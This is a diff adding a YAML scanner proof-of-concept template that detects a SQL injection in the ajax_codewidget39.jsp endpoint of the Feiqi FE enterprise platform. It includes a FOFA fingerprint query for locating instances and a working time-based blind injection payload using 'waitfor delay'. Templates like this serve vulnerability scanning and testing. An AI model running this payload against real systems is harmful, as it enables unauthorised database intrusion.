@@ -1,0 +1,33 @@
+id: poc-yaml-flyrise-ajax-codewidget39-sqli
+info:
+  name: 飞企互联FE企业运营管理平台ajax_codewidget39.jsp接口存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /common/ajax_codewidget39.jsp;.js
+  expression: 'status_code == 200 &&
+
+    contains(body,"select_list") &&
+
+    duration <= 5
+
+    '
+- method: GET
+  path: /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,"select_list")
+
+    '
+transport: http
